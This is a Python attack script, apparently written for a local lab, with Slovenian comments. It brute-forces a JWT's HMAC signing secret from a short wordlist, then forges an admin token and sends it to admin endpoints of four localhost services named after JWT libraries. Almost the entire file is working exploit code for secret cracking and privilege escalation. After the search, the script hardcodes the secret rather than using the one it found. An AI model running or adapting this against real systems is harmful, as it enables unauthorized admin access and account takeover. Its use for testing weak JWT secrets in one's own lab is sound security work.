import hmac, hashlib, base64, json, requests

def b64d(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def verify_secret(token, secret):
    parts = token.split('.')
    if len(parts) != 3:
        return False
    msg = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    return expected_sig == parts[2]

# Pridobi token
r = requests.post('http://localhost:5000/login')
token = r.json()['token']
print(f"Token: {token[:50]}...")

# Wordlist
wordlist = [
    "secret", "password", "123456", "supersecret",
    "mysecret", "supersecretkey123", "jwt_secret", "admin"
]

print("\nBrute force attack...")
found = False
for word in wordlist:
    if verify_secret(token, word):
        print(f"[!] Secret najden: {word}")
        found = True
        break
    else:
        print(f"[-] Preizkušam: {word}")

if not found:
    print("[x] Secret ni bil najden v wordlistu")


# dodaj na konec attack_brute.py
import struct

if found:
    secret = "supersecretkey123"
    
    # Ustvari admin token z najdenim secretom
    header = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b'=').decode()
    payload = base64.urlsafe_b64encode(json.dumps({"user":"hacker","role":"admin","exp":9999999999}).encode()).rstrip(b'=').decode()
    
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    
    forged = f"{header}.{payload}.{sig}"
    
    # Testiraj na vseh knjižnicah
    targets = {
        "PyJWT":        "http://localhost:5000/admin",
        "jsonwebtoken": "http://localhost:3000/admin",
        "php-jwt":      "http://localhost:8080/admin",
        "jjwt":         "http://localhost:8081/admin",
    }
    
    print("\nAdmin dostop z ukradenimi kredenciali:")
    for name, url in targets.items():
        r = requests.get(url, headers={'Authorization': f'Bearer {forged}'})
        print(f"{name}: {r.json()}")